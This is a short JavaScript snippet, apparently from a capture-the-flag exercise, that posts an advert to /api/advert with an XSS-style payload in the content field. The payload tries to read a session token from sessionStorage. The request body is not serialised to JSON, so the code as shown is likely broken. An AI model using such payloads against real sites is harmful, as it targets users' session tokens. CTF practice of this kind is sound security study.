console.log('try xss for CTF');
fetch('/api/advert',
    {
        method:"post",
        body: {
                title:"H",
                content:"sessionStorage.getItem('token')",
                author:{'email':''},
                sponsor:{'name':'Fresh-gumÂ®'}
            },
        headers: {
            Accept: 'application/json',
            "Content-Type":'application/json'
        }
    }).then(response => console.log(response.json()));
